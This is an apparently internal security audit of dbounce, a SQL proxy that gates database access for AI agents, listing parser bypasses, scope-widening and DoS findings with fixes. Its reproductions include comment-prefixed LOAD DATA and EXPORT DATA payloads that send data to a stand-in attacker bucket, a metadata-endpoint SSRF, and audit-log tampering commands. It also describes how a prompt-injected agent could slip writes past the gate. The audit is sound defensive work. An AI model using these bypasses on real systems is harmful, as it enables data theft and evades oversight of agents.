# dbounce v1.0 Security Audit — D-Slices 1-8 (BB + WB)

Read+report audit performed against `dbounce v1.0` after the
multi-agent D-Slice 1-8 landing sequence. Pattern is the audit-cadence
discipline established by prior products: after any security-relevant
sequence of changes, spawn a focused BB+WB audit BEFORE declaring done.

## 1. Scope + methodology

### In scope
- All D-Slice 1-8 code paths (parser, proxy/forward, proxy/mysql,
  proxy/tls, store, rules, profile, profile/install, presets, mcp,
  upstream, cli)
- Cross-slice interaction surfaces (TLS+MySQL guard, port-race fix,
  cli profileWriterAdapter conversion, pause+prompt enqueue ordering)
- Black-box probes per the audit brief (SQL-injection-style keyword
  bypass, MySQL auth race, CALL allowlist escape, CTE-hidden writes,
  YAML deserialization, pause window race, decision_id integrity,
  sensitive-data leakage, outbound URL allowlist)
- White-box review per the audit brief (keyword pre-check correctness,
  CreateProfile lossy conversion, MgmtListener loopback guard,
  AddLocalProfile atomicity, MCP schema validation, healthz
  sanitization, decisions append-only)

### Out of scope
- Build / supply-chain (Dockerfile, GHCR publish workflow)
- Test code (`*_test.go`)
- Docs accuracy beyond security-claim verification
- Future post-launch slices (D-Slice 9+)

### Severity rubric
- **CRIT** — exploit at low cost, normal user role, default config
- **HIGH** — exploit possible with conditions (specific config, role
  or threat-model assumption that's still plausible)
- **MED** — defense-in-depth issue or correctness gap with security
  consequence
- **LOW** — hardening / clarity
- **INFO** — note for future reviewers; not a deficiency

### Approach
Read+report only. No source-code changes in this commit. Each finding
includes: severity, location, reproduction, fix recommendation, test
gap.

---

## 2. Findings

### CRIT-D8-01 — MySQL LOAD DATA exfil bypass via comment prefix
- **Severity**: CRIT
- **Location**: `internal/parser/mysql.go:71-81`
- **Surface**: MySQL wire-protocol path (D-Slice 5).

The LOAD-DATA pre-check uses `strings.HasPrefix(strings.ToUpper(
strings.TrimSpace(raw)), "LOAD DATA")`. SQL comments are not stripped
before the prefix test, but MySQL's actual parser (and the xwb1989
fallback) DO accept leading comments. Therefore:

```
/* x */ LOAD DATA INFILE '/etc/passwd' INTO TABLE u FIELDS TERMINATED BY ','
```

- TrimSpace leaves the comment in place.
- `HasPrefix(upper, "LOAD DATA")` → false.
- Falls through to xwb1989/sqlparser.
- xwb1989 does NOT model `LOAD DATA`. Returns parse error.
- Parser returns `StatementType=UNPARSEABLE`, `IsDML=false`,
  `IsDDL=false`, `HasMutatingNode=false`, `TablesTouched=nil`.
- Rule engine: no `MUTATING:*` / `LOAD:*` / table-scoped rule fires.
- Profile gates: `DenyActions=["LOAD"]` doesn't match `"UNPARSEABLE"`;
  `DenyASTMutatingNodes` doesn't fire (no mutating node).
- In **cooperative mode (the default)** the wire-protocol path still
  FORWARDS the statement upstream (cooperative DENY is advisory).
- Audit row records UNPARSEABLE — the exfil action is not flagged as
  a LOAD-class event, just as "the parser couldn't read this".

The same shape applies to `LOAD XML` and `LOAD INDEX`. Identical
issue is latent for Snowflake/BigQuery (see CRIT-D8-02 below) but the
MySQL surface is the wire-protocol intercept — a normal SQL client
session is sufficient.

**Reproduction**:
1. `dbounce run --dialect=mysql --upstream mysql://... --mode cooperative`
   (cooperative is the documented lean-permissive default)
2. From a normal MySQL client: `/* */ LOAD DATA INFILE '/etc/passwd'
   INTO TABLE leak`
3. Statement forwards to upstream; audit row reports `UNPARSEABLE`
   not `LOAD`.

**Fix recommendation**: Strip SQL comments before the prefix detection.
Two-pronged: (a) implement a small `stripLeadingComments` helper that
consumes any leading `--` line comments and `/* … */` block comments
(handling nesting per MySQL/PG/Snowflake conventions) and is invoked
before the prefix tests in mysql.go, snowflake.go, bigquery.go;
(b) additionally classify UNPARSEABLE statements as
`HasMutatingNode=true` on the conservative principle that "we could
not confirm this is benign" — the rule pack and profile evaluator
already gate on that flag, so this single change closes the
defense-in-depth gap.

**Test gap**: No test exercises a comment-prefixed dialect-specific
verb. `internal/parser/mysql_test.go` covers raw `LOAD DATA INFILE`
but not `/* */ LOAD DATA`. Add table-driven cases with leading line
comments, leading block comments, mixed whitespace+comments, and
nested block comments.

---

### CRIT-D8-02 — Snowflake/BigQuery dialect-verb bypass via comment prefix
- **Severity**: CRIT (latent; see exploit notes)
- **Location**: `internal/parser/snowflake.go:195-273`,
  `internal/parser/bigquery.go:159-203`
- **Surface**: `dbounce decide` CLI + `dbounce_decide` MCP tool
  (JDBC-shim invocation path).

Same root cause as CRIT-D8-01: `classifySnowflakeExtension` and
`classifyBigQueryExtension` use `strings.HasPrefix(upper, "EXPORT
DATA")` / `"COPY INTO"` / `"PUT"` / `"GET"` / `"UNDROP"` /
`"USE SECONDARY ROLES"` / `"GRANT"` / `"REVOKE"` / `"CREATE MODEL"`
etc. without comment-stripping. A leading `/* */` comment causes the
prefix test to miss and the statement falls through to xwb1989, which
does not recognize any of these verbs.

Result: an attacker submitting `/* */ EXPORT DATA OPTIONS(uri=
'gs://attacker/foo') AS SELECT * FROM secrets.api_keys` through the
shim path gets classified as UNPARSEABLE. Rule packs whose deny
targets `EXPORT-DATA` / `COPY-INTO-STAGE` / `PUT` / `UNDROP` never
match.

Why CRIT (vs HIGH) despite the JDBC-shim invocation path: the shim's
*intended* purpose is to gate AI-agent SQL requests against Snowflake
and BigQuery before they reach the real driver — the entire D-Slice 6
shape exists for that. An attacker prompt-injecting an agent that
calls `dbounce_decide` with a comment-prefixed `EXPORT DATA` bypasses
the gate that was the only reason dbounce was inserted into the
pipeline. The deployed cooperative-mode behavior of forwarding the
statement after an advisory verdict completes the exploit.

**Reproduction**: identical to CRIT-D8-01, swap MySQL for Snowflake /
BigQuery and use the shim invocation path via `dbounce decide
--dialect=snowflake` or the `dbounce_decide` MCP tool.

**Fix recommendation**: Identical to CRIT-D8-01.

**Test gap**: same as CRIT-D8-01 — add comment-prefix table-driven
tests to `snowflake_test.go` and `bigquery_test.go` for every
mutating-node verb the rule pack relies on. The keyword pre-check is
the entire layer-1 of the gate for these dialects; its correctness is
the whole calibration story for them.

---

### HIGH-D8-03 — profileWriterAdapter.CreateProfile drops allow-rule scopes (silent widening)
- **Severity**: HIGH
- **Location**: `internal/cli/cli.go:214-262`
- **Surface**: `dbounce presets apply`, `dbounce rules recommend`,
  `dbounce prompts answer --kind profile`.

The adapter converts `[]rules.ProxyRule` into `[]profile.
ProfileAllowRule` for persistence. Only `Pattern` and `Note` are
preserved. The source rule's `SchemaScope`, `TableScope`,
`FunctionScope`, `Origin`, and `Effect` fields are DROPPED:

```go
p.AllowRules = append(p.AllowRules, profile.ProfileAllowRule{
    Pattern: r.Pattern,
    Note:    r.Note,
})
```

`profile.ProfileAllowRule` carries only `Pattern`, `ArnScope` (iam-jit
field, ignored by dbounce), `RegionScope` (same), and `Note`. There
is no place for the dropped axes to land.

Consequence: a rule semantically "allow SELECT only on schema=reporting"
becomes "allow SELECT on any schema" once persisted as a profile rule.
This is **strictly more permissive** than the input — the gate widens
silently. The opposite direction (deny conversion at lines 234-247)
drops only the table_glob half, which makes denies broader (safer
direction) but breaks operator intent.

**Why latent today, urgent before public traffic**: the shipped
`internal/presets/presets.yaml` does not yet use scope fields (grep
verified: no `*_scope` keys in the YAML). So no built-in preset
currently triggers the widening. However:
- the `rules recommend` path passes scoped rules through to the
  adapter unchanged
- the `prompts answer --kind profile` path persists user-curated
  rules with whatever scope the original rule carried
- a single future preset that does the textbook "allow SELECT scoped
  to reporting schema" pattern would silently lose the scope on
  install

**Reproduction**:
1. Add a rule: `dbounce rules add 'SELECT:*' --effect=allow
   --schema-scope=reporting`
2. Trigger any `CreateProfile` call site (e.g. answer a pending
   prompt with `--kind=profile`).
3. Inspect the resulting profile.yaml: the saved allow rule has
   no schema scope.
4. Profile evaluator now allows SELECT on any schema, not just
   reporting.

**Fix recommendation**: Two reasonable options, pick one. (a) Extend
`profile.ProfileAllowRule` with `SchemaScope`, `TableScope`,
`FunctionScope` (additive YAML fields, backwards-compatible) and
round-trip them through the adapter — this is the right long-term
shape because the profile evaluator already uses the same rule
engine. (b) Reject `CreateProfile` calls whose allow rules carry
non-empty scope fields with a clear error pointing the operator at
`rules add` (which preserves scopes) — closes the gap but loses a
feature surface. Option (a) is recommended.

**Test gap**: No test verifies that scope fields survive a round-trip
through `profileWriterAdapter.CreateProfile`. Add a regression case
to `internal/cli/cli_test.go` that constructs a scoped rule, calls
CreateProfile, reads the persisted YAML back, and asserts the scope
is intact (or fails loudly per option b).

---

### HIGH-D8-04 — Management listener lacks loopback bind guard
- **Severity**: HIGH
- **Location**: `internal/cli/cli.go:405-414` (wire listener guard
  present); `internal/cli/cli.go:614-616` (mgmt listener flag, NO
  guard).

The wire-protocol listener enforces a loopback default + requires an
explicit `--i-know-this-binds-externally` flag to bind a non-loopback
host (CRIT-32-02 closure for the credential-handling surface). The
management listener (`--mgmt-host`, default 127.0.0.1) has no
equivalent guard. An operator can pass `--mgmt-host 0.0.0.0` and the
binary will silently bind `/healthz` to every interface.

`/healthz` discloses:
- `mode`, `default_policy`, `dialect`, `active_profile` (operator
  configuration)
- `decisions_count` (volume signal — useful for an attacker to know
  when the deployment is in use)
- `lookup_errors_counter` (deployment health)
- `pause` block with `id`, `started_at`, `ends_at`, and **`reason`
  (free-text operator-supplied string)** — the reason field could
  contain incident IDs, debugging context, or any other text the
  operator typed into `dbounce pause start --reason '…'`

None of these are catastrophic individually, but the combination is
sufficient to fingerprint the deployment + know when to attempt
attacks (pause windows mean the gate is operationally degraded), and
the `reason` text is operator-controlled and not designed for public
disclosure.

The asymmetry between the two listeners is a footgun. Operators who
read the wire-listener guard message learn that loopback is the safe
default and may not realize the mgmt listener has no equivalent
protection.

**Reproduction**:
1. `dbounce run --mgmt-host 0.0.0.0` — no error, binds publicly.
2. `curl http://<external-ip>:8768/healthz` from anywhere — discloses
   the JSON payload above.

**Fix recommendation**: Apply the same `loopbackHosts` guard to
`mgmtHost`. Add a parallel `--i-know-mgmt-binds-externally` escape
hatch. Optionally also redact the `pause.reason` field when the mgmt
listener is bound externally (cheaper than removing it; still
hardens).

**Test gap**: No test asserts the loopback guard exists for mgmt
host. Add a CLI-level test that confirms `--mgmt-host 0.0.0.0` is
rejected without the override flag.

---

### HIGH-D8-05 — profile install lacks response size limit (memory DoS)
- **Severity**: HIGH
- **Location**: `internal/profile/install.go:138`
- **Surface**: `dbounce profile install --from URL`.

```go
payload, err := io.ReadAll(resp.Body)
```

There is no `io.LimitReader` on the response body. A malicious or
compromised distribution server can return arbitrary-sized payloads.
`yaml.Unmarshal` will then attempt to parse the entire buffer.
Even with a benign YAML structure, multi-GB payloads can OOM-kill
the process or exhaust the host's swap / memory. With a yaml-bomb
structure (deeply nested anchors), parsing time scales further.

**Reproduction**:
1. Stand up a server at `https://attacker.example/profile.yaml` that
   responds with `Content-Length: 10737418240` and streams 10 GiB of
   yaml-shaped bytes.
2. `dbounce profile install --from https://attacker.example/profile.yaml`
3. Process memory grows unbounded; killed by OOM or the OS kills
   neighboring processes first.

**Fix recommendation**:
```go
const maxProfilePayload = 1 << 20  // 1 MiB is generous for YAML profiles
payload, err := io.ReadAll(io.LimitReader(resp.Body, maxProfilePayload+1))
if err == nil && len(payload) > maxProfilePayload {
    return nil, installErr(InstallExitPayload,
        fmt.Sprintf("payload exceeds maximum size of %d bytes", maxProfilePayload))
}
```

Pair with a `yaml.Decoder` with a node-count cap if go-yaml v3 exposes
one (it does not as of current release; the size cap is sufficient
defense). The Timeout already bounds wall-clock — this adds the
memory bound.

**Test gap**: No test covers oversized response handling. Add a test
fixture using `httptest.NewTLSServer` that returns >1 MiB of bytes
and assert the install fails with the size-cap error.

---

### MED-D8-06 — Upstream URL allowlist does not exclude internal IP space (SSRF-shaped)
- **Severity**: MED
- **Location**: `internal/upstream/upstream.go:185-245`
- **Surface**: `dbounce run --upstream postgres://...`,
  `dbounce run --upstream mysql://...` (operator-supplied flag).

`upstream.Resolve` validates the URL scheme and that a host is
present, then appends the default port if missing. There is no check
against:
- AWS/GCP/Azure instance-metadata endpoints (169.254.169.254)
- IPv6 link-local (fe80::/10)
- Any RFC1918 / RFC4193 ranges
- `.internal` TLDs
- Loopback (127.0.0.0/8, ::1)
- Any DNS rebinding defense

Because the URL comes from an operator-supplied CLI flag, the threat
model is bounded — but dbounce's positioning includes auto-config
flows (per memory: "iam-jit configures itself") and CI deployments
where the upstream URL is built from environment variables, secrets
managers, or LLM-generated configuration. In any of those, an
adversarial input to URL resolution can cause dbounce to dial
internal-only services (instance metadata for cred exfil, internal
PostgreSQL/MySQL clusters bypassing network policy).

The existing `hostAllowed` helper in `forward.go:519` is a no-op when
`inboundHost == ""` (always true in current paths), and there is no
direct allowlist of the configured upstream URL against internal
ranges.

**Reproduction**: requires operator-influenced URL.
1. `dbounce run --upstream postgres://x@169.254.169.254:5432/foo`
2. Connect a PG client; dbounce dials the metadata endpoint.

**Fix recommendation**: At `upstream.Resolve` time, resolve the host
to IPs once (`net.LookupHost`) and reject IPs in well-known internal
ranges unless an explicit `--upstream-allow-internal-ip` opt-in is
present. This is defense-in-depth; operators who genuinely point to
a private RFC1918 PostgreSQL get a clear error explaining the
override.

**Test gap**: No test verifies internal-IP rejection. Add table-
driven cases covering 127.0.0.1, 169.254.169.254, 10.x, 172.16.x,
192.168.x, fe80::, ::1.

---

### MED-D8-07 — Decisions table has no append-only enforcement
- **Severity**: MED
- **Location**: `internal/store/store.go:147-258`
- **Surface**: any user with read+write access to the SQLite file.

The `decisions` table is created with the default SQLite semantics
(any user with `sqlite3 state.db` access can UPDATE or DELETE rows).
No triggers prevent post-write mutation, no append-only constraint
exists. The audit log is therefore "honest log" rather than
"tamper-evident log".

The dbounce documentation positions the audit log as the gating
invariant (see `forward.go:33` comment and the
[[creates-never-mutates]] memory entry). A user who can write to the
SQLite file can edit history, erasing evidence of denied attempts or
falsifying allow records.

The file lives at `~/.dbounce/state.db` with parent-dir 0o700 —
which limits scope to the same user dbounce runs as. So the practical
risk is: an attacker who already has the dbounce user's UID can also
tamper with the audit log. This is a defense-in-depth issue, not an
escalation.

**Reproduction**:
1. `sqlite3 ~/.dbounce/state.db "UPDATE decisions SET
   decision_verdict='ALLOW' WHERE id=42"`
2. `dbounce audit tail` now shows the falsified row.

**Fix recommendation**: SQLite supports immutable tables via triggers
that reject UPDATE/DELETE. Add:
```sql
CREATE TRIGGER IF NOT EXISTS decisions_no_update
  BEFORE UPDATE ON decisions
  BEGIN SELECT RAISE(ABORT, 'decisions is append-only'); END;
CREATE TRIGGER IF NOT EXISTS decisions_no_delete
  BEFORE DELETE ON decisions
  BEGIN SELECT RAISE(ABORT, 'decisions is append-only'); END;
```
Triggers are bypassable by the same user via PRAGMA toggles, so this
is not cryptographic tamper-evidence. For full tamper-evidence,
emit a rolling hash chain across rows (each row's `prev_hash`
column references the prior row's content hash) — separate slice
post-launch.

Document the limitation in `docs/SECURITY-MODEL.md` (does not yet
exist).

**Test gap**: No test asserts UPDATE/DELETE attempts on decisions
are rejected.

---

### MED-D8-08 — pending_prompts has no foreign-key integrity to decisions
- **Severity**: MED
- **Location**: `internal/store/store.go:243-258`
- **Surface**: any user with read+write SQLite access.

The `pending_prompts.decision_id` column references a decision row's
id but is declared `INTEGER NOT NULL` only — there is no FOREIGN KEY
constraint, and even if there were, `PRAGMA foreign_keys = ON` is not
set on the SQLite connection. A user with DB write access can:
- delete the decision row that a pending prompt points at (dangling
  reference; `dbounce prompts list` will show prompts referencing
  non-existent decisions)
- insert a new decision with the same id (after delete) so the
  prompt now points at a falsified decision

The integrity gap is symmetric to MED-D8-07's tamper-evidence gap and
has the same UID-limited threat model. The combined effect: a prompt
queued for "operator review of denied DELETE on prod.users" can be
re-pointed at a benign "SELECT 1" by the same UID, so the operator
reviewing the prompt sees innocuous context.

**Reproduction**:
1. Trigger a deny + prompt enqueue.
2. `sqlite3` open the DB.
3. Delete the decision row + insert a benign decision row that
   re-uses the same id (SQLite auto-increment won't reuse on its
   own; manual INSERT with explicit id will).
4. `dbounce prompts list` and `dbounce prompts answer` operate on
   the falsified context.

**Fix recommendation**: Declare the FK + enable enforcement.
```sql
-- in CREATE TABLE pending_prompts:
decision_id INTEGER NOT NULL REFERENCES decisions(id),
-- and at connection time:
db.Exec("PRAGMA foreign_keys = ON")
```
This still does not prevent a same-UID attacker from disabling the
pragma — see MED-D8-07's note about tamper-evidence requiring a hash
chain. But the FK closes the *honest* integrity gap.

**Test gap**: No test verifies decision_id refers to an existing
decisions row.

---

### MED-D8-09 — Statement bodies (potentially containing secrets) stored verbatim
- **Severity**: MED
- **Location**: `internal/store/store.go:425-457` (RecordDecision),
  `internal/cli/cli.go:765-829` (`audit tail` text output),
  `internal/cli/cli.go:769-804` (`audit tail --json` full output),
  `internal/mcp/server.go:571-607` (`dbounce_tail_decisions`).
- **Surface**: anyone with `dbounce audit tail` access or MCP access.

The raw SQL text the client sent is stored verbatim in
`decisions.statement` (intentional, for audit reconstruction). The
audit-tail text view truncates the statement to 60 chars + reason to
80 chars, which mitigates casual exposure — but:
- `audit tail --json` emits the FULL statement text
- `dbounce_tail_decisions` MCP tool returns the FULL statement text
- The raw row is in the DB at 0o600 + dir 0o700 — same UID can read
  it directly

SQL statements commonly contain secrets:
- `SELECT pwd_hash FROM users WHERE email = 'admin@…'` (PII)
- `INSERT INTO sessions VALUES ('…token…', …)` (credentials)
- `UPDATE config SET api_key = '…' WHERE …` (operator-managed
  secrets)
- Connection-string parameters when an agent submits a
  `psql 'postgres://user:pass@…'`-shaped error context

The audit log's value depends on preserving the SQL, so wholesale
redaction is wrong. But there is no current option for the operator
to elect for redacted storage (constants extracted as `?`-placeholders,
common-secret patterns scrubbed). MCP exposure is the most concerning
surface because an agent now has access to historical SQL bodies that
may have contained ad-hoc credentials.

**Reproduction**:
1. Submit `INSERT INTO secrets VALUES ('alice', 'sk-live-…')` through
   the proxy.
2. `dbounce audit tail --json` — the full statement, including the
   secret literal, appears in the output.

**Fix recommendation**: Add a `--redact-literals` flag to
`dbounce run` that swaps string and numeric literals for `?` (using
the parsers already in place) before storage. Default false to
preserve current behavior; document as a Pro-tier hardening
option. Also consider redacting common secret patterns
(sk-…, AKIA…, eyJ… JWT prefixes) in audit-tail output even when
the underlying row is full text.

**Test gap**: No test verifies that secret-shaped literals are
visible in audit output (or, post-fix, that they're scrubbed).

---

### MED-D8-10 — Pause-demoted DENY hidden from TaskReview DenyCount
- **Severity**: MED
- **Location**: `internal/store/rules.go:392-452` (TaskReviewSummary).
- **Surface**: `dbounce tasks review`.

When a pause window demotes a transparent-mode DENY to ALLOW (per
proxy.go:540-558), the row is written with `decision_verdict=ALLOW`
and a reason like "pause-window demoted: rule engine wanted DENY (…)".
`TaskReviewSummary` switches on the persisted verdict string:

```go
switch verdict {
case "ALLOW": out.AllowCount++
case "DENY": out.DenyCount++
}
```

Pause-demoted decisions therefore count as ALLOW in the task review.
A reviewer running `dbounce tasks review TASK_ID` sees "0 denies"
even when the rule engine would have denied the action — the very
visibility surface designed to surface "what was blocked while task
X ran" silently undercounts when pause windows are in play.

The audit row's `decision_reason` retains the original DENY intent,
so the data is recoverable — but the summary count is misleading.

**Reproduction**:
1. Start a task with a deny rule.
2. Start a pause.
3. Trigger a request that the deny rule would catch.
4. End the task. `dbounce tasks review TASK_ID` reports 0 denies.

**Fix recommendation**: In TaskReviewSummary's scan loop, also pull
`pause_id` and add a third counter (PauseDemotedCount) plus separate
listing of pause-demoted-would-have-denied calls. Update the CLI
output to display it. Mirrors the audit-row design where pause_id +
original reason are persisted exactly for this kind of post-incident
review.

**Test gap**: No test asserts TaskReview's count behavior with pause
demotion. Add a case to `internal/store/rules_test.go` (or
equivalent) that creates a denied-then-demoted row during a task
window and asserts the review separates the categories.

---

### MED-D8-11 — MCP dbounce_decide accepts unbounded SQL input
- **Severity**: MED
- **Location**: `internal/mcp/server.go:481-489`,
  `internal/mcp/server.go:105-108`.
- **Surface**: MCP-over-stdio.

The JSON-RPC scanner is bounded at 4 MiB per line
(`scanner.Buffer(…, 4*1024*1024)`). Within that bound, the
`dbounce_decide` tool happily takes a SQL string of arbitrary size
and hands it to `parser.Parse`. libpg_query has internal bounds;
xwb1989 does not enforce a tight cap; the snowflake/bigquery prefix
checks scan the entire upper-cased buffer.

A malicious or runaway agent can submit large SQL strings repeatedly
to consume CPU + memory in parsing. Combined with the JSON-RPC line
buffer, an attacker can DoS the MCP server (and the dbounce process
itself) with several hundred KB per call.

The MCP server runs as the operator who started it; the agent
connecting "should be" trustworthy — but the agent-safety adoption
play (from memory: [[agent-safety-adoption-play]]) explicitly
positions dbounce as the safety layer between Claude Code and the
database. Treating the agent's input as untrusted is the right
threat model.

**Reproduction**:
1. `dbounce mcp`
2. Send a `tools/call` request with `dbounce_decide` and a 3 MiB
   SQL string of repeated `SELECT * FROM t UNION ALL `…
3. Parser CPU dominates; loop a few hundred times to OOM.

**Fix recommendation**: Add a per-tool input size cap (16 KiB is more
than enough for any legitimate SQL statement) at the MCP call entry
point. Surface a clear error: "statement exceeds X bytes; submit
smaller chunks". Apply uniformly to all 9 MCP tools.

**Test gap**: No DoS-shape test on MCP tool inputs. Add a test that
submits an oversized statement and asserts the error.

---

### LOW-D8-12 — AddLocalProfile temp file does not fsync before rename
- **Severity**: LOW
- **Location**: `internal/profile/profile.go:1119-1138`,
  `internal/profile/install.go:376-396` (same shape in installer
  writeInstalledProfiles).
- **Surface**: any `AddLocalProfile` or `writeInstalledProfiles`
  call (presets apply, prompts answer, profile install).

The tempfile + rename pattern is correct for atomicity at the
filesystem-namespace level (the directory entry change is atomic on
POSIX). However, the temp file is closed without `tmp.Sync()`, so
the kernel may have buffered the write but not yet flushed to disk
when `os.Rename` happens. A power loss between Rename and the
buffered write reaching the platter can leave the profiles.yaml
inode pointing at empty / partial data — operators come back to a
corrupt or empty file after a crash.

The atomicity claim in the docstring
("crash between truncate + write can never leave a half-written
profiles.yaml") is incomplete: it's true for the standard rename
pattern *only when the data is durably on disk first*.

**Reproduction**: requires a hard power loss between rename and
disk flush. Difficult to reproduce on demand; theoretically observable
under heavy crash testing.

**Fix recommendation**: Add `tmp.Sync()` before `tmp.Close()`. Add
`syscall.Sync()` (or platform-equivalent) on the parent directory
after the rename for maximum durability — gopsutil-style.

**Test gap**: No durability test. Hard to test without a crash
simulator; document the fix as part of the atomicity invariant.

---

### LOW-D8-13 — MySQL handshake exposes server version "8.0.0-dbounce-observation"
- **Severity**: LOW
- **Location**: `internal/proxy/mysql.go:168`.
- **Surface**: MySQL observation-only mode.

The mysqlObservationHandshake announces `serverVersion =
"8.0.0-dbounce-observation\x00"`. This deliberately identifies the
proxy to MySQL clients in observation mode, which is useful for
debugging — but it also fingerprints dbounce on the wire. An attacker
scanning a network for SQL services learns immediately which hosts
are running dbounce in observation-only mode (i.e. no real DB
behind it, no enforcement).

The forwarding mode passes the upstream's version through unchanged
(no fingerprint added).

**Reproduction**: connect any MySQL client to a dbounce-in-
observation deployment; banner reveals identity.

**Fix recommendation**: Make the suffix optional (off by default for
production; on for debug). Or use a generic banner like `8.0.0` and
log a single startup line confirming "dbounce in observation mode"
so operators have the info without putting it on the wire.

**Test gap**: No test asserts the banner shape. Acceptable for LOW
finding; if the fix lands, add a regression case.

---

### INFO-D8-14 — Stub ProfileWriter error surface is silent (no log on fall-through)
- **Severity**: INFO
- **Location**: `internal/cli/prompts.go:70-72`.

```go
func (stubProfileWriter) CreateProfile(string, string,
    []dbrules.ProxyRule, []dbrules.ProxyRule) error {
    return errors.New("dbounce: profile writer not configured")
}
```

When a CLI command falls through to this stub (e.g. an invocation
that didn't wire `newCLIProfileWriter` for some build path), the
caller gets a generic error with no context about which call site
triggered it or which arguments were passed. Triage requires reading
the source.

Not a security issue. Note for future maintainability: add the call
site (`name`) to the error message, or log a warning at construction
time when the stub is selected.

---

## 3. Notable non-findings (things probed that passed)

These items were specifically probed per the audit brief and found to
be sound:

- **PG CTE-wrapped writes (BB-4)**. The libpg_query walker in
  `postgres.go:244-435` recursively descends through `SelectStmt`,
  `CommonTableExpr`, and `SubLink` nodes and calls `flagMutating`
  for any `InsertStmt`/`UpdateStmt`/`DeleteStmt`/`MergeStmt` it
  encounters. The depth cap of 256 prevents stack abuse. Test
  coverage in `postgres_test.go` includes `WITH x AS (UPDATE …) SELECT
  * FROM x` and re-classifies as `WITH-WRITE`. This was the most
  important load-bearing invariant to verify; it holds for PG.

- **PG StartupMessage size cap (WB-6)**. `forward.go:225` rejects
  startup messages where `length < 8 || length > 1<<20` before
  allocating the body buffer. A malformed SSLRequest with a wrong
  magic number gets handled correctly (re-read 8 bytes for the
  StartupMessage). The TLS upgrade path in `tls.go:170-189` rejects
  bytes that don't form a valid SSLRequest preamble.

- **Port-race fix correctness (WB-5)**. The new `WireListener` /
  `MgmtListener` config fields in `proxy.go:220-228` are pre-bound
  listeners ONLY for tests. Production code paths (`cli.go` calling
  `proxy.NewServer` + `Serve` without pre-binding) still take the
  `net.Listen` branch unchanged. All connection-level security
  properties (host allowlist enforced via TLS handshake + dial
  upstream + SCRAM passthrough) fire from the per-connection
  handlers, not from the listener init — so the listener-substitution
  pattern does not bypass them. Verified by reading `proxy.go:306-318`
  + tracing the data flow through `serveConn`.

- **Profile YAML injection via install (BB-5)**. `gopkg.in/yaml.v3`
  unmarshals into structurally-typed Go structs. There is no
  `!!python/object`-style polymorphic deserialization in Go YAML.
  The install path validates the parsed Profile struct
  (`p.validate()` at install.go:308) before accepting it. Safe.

- **HTTPS-only profile install (BB-5 adjacent)**. `requireHTTPS` at
  install.go:249 rejects any non-https URL with a clear operator-
  facing error. Optional SHA256 pinning is available. Sound.

- **No SQL injection in dbounce's own SQLite queries**. All store
  package queries use `?`-parameterization. The only `fmt.Sprintf`
  on a query string (store.go:331) builds an `ALTER TABLE ADD COLUMN`
  statement from compile-time constants; no user input reaches it.

- **MySQL auth phase pass-through (BB-2)**. `pumpMySQLAuthPhase` at
  `mysql.go:369-405` is a strict server→client→server→client
  ping-pong with a 16-hop cap. The auth-termination check on
  `payload[0] == mysqlOKPacketByte / mysqlErrPacketByte` correctly
  ends the loop before any client COM_QUERY can be processed in the
  auth phase. The COM_QUERY path in `commandLoop` only fires AFTER
  auth termination. No race window observed.

- **Cross-slice TLS+MySQL guard (WB-4)**. The guard at `cli.go:394-401`
  checks all three relevant flags (`--listener-tls-cert`,
  `--listener-tls-key`, `--require-client-cert`) when dialect=mysql
  and fails fast. The MySQL path is only reachable via the `dbounce
  run` subcommand; no other entry point sets up a MySQL listener.
  Sound.

- **Listener-TLS upgrade malformed SSLRequest (WB-6)**.
  `looksLikeSSLRequest` at `tls.go:62-69` rejects any 8-byte preamble
  whose length != 8 or magic != 80877103. The wrong-length case
  (preamble claims length 8 but content is not the magic) just falls
  through to the plaintext StartupMessage path, where the bytes are
  treated as the start of a StartupMessage and the unexpected
  magic-byte content fails libpg_query parsing immediately. No
  panic, no buffer over-read, no information disclosure.

- **healthz output (WB-9)**. `proxy.go:835-879` emits a fixed payload
  shape. No version string, no internal paths, no PII. The only
  operator-controllable field is `pause.reason` — flagged in HIGH-D8-04
  for the mgmt-listener external-bind case.

- **CALL allowlist escape (BB-3)**. The PG walker treats `CallStmt`,
  `DoStmt`, `ExecuteStmt` as opaque and calls `flagMutating` for the
  whole shape; `MUTATING:*` rules catch them. `EXECUTE 'CALL bad()'`
  would parse as an ExecuteStmt (the inner SQL is a string literal,
  not recursively analyzed) — flagged as mutating, gated by the
  same mechanism. No CTE-style nesting bypass observed.

- **pending_prompts decision_id reuse (BB-7)**. The application code
  always inserts a decision row and uses the returned id; it never
  reads decision_id from external input. The only attack vector is
  direct SQLite write (covered in MED-D8-07 + MED-D8-08). The
  in-process flow is safe.

---

## 4. Audit-reproducibility appendix

### Commit hash
- HEAD at audit time: `c5f25b629a2a7bd11226eda3ff5ad49a1d6a05b4`
- D-Slice 1-8 scope reference: `ff419f6` (Docker landed). The diff
  between ff419f6 and HEAD is `Makefile + compose.test.yaml` only;
  the audited Go source matches.

### Test counts at audit time
- `go test ./... -count=1` PASS across all 14 packages.
- 454 test functions executed (counted via `=== RUN` markers).
- No flakes observed in three consecutive runs.

### Environment
- Go: `go version go1.25.7 darwin/arm64`
- Platform: macOS arm64.

### Tooling
- Static-analysis: native `go vet` clean on the tree at this commit.
- Manual review (Read + Bash grep). No automated SAST run for this
  audit — intentional, the prior audit-cadence rounds (per
  [[audit-cadence-discipline]]) caught issues that automated tools
  missed and manual review continues to find issues fast enough to
  justify the focus.

### Probes that produced no finding
The following probes from the brief were executed but produced no
distinct finding beyond what is captured above:

- Profile YAML `!!python/object` injection (Go YAML is structurally
  typed; not applicable).
- Pause window TOCTOU race (intentional behavior; the demote decision
  reflects the pause status at decision time; subsequent stop does
  not retroactively un-demote).
- CALL inside `EXECUTE 'CALL …'` (already gated as
  `ExecuteStmt → flagMutating`).
- MCP tool input schema mismatch (the runtime tools rely on Go
  arg-coercion, not JSON-Schema validation — the schemas in
  `tools.go` are documentary; tool handlers handle missing/wrong
  types by returning defaults or errors).

### How to reproduce the audit
1. `git checkout c5f25b6` (or `ff419f6`).
2. Read each file referenced in the findings above (paths are
   absolute-from-repo-root in the citations).
3. For BB findings, the reproductions are exact commands; the CRIT
   findings (D8-01 + D8-02) can be reproduced by a one-line test
   added to `internal/parser/mysql_test.go` or
   `internal/parser/snowflake_test.go` calling `parseMySQL("/* */
   LOAD DATA …")` and asserting on the resulting `StatementType`.
4. Re-run `go test ./... -count=1` to confirm the test surface is
   green at this commit.

---

## 5. Disposition

**Recommended next steps** (NOT performed in this audit — fixes are a
separate task per [[deliberate-feature-completion]]):

1. CRIT-D8-01 + CRIT-D8-02 (same root cause): add comment-stripping
   helper + classify UNPARSEABLE as HasMutatingNode=true. Single
   slice; ship before any public traffic.
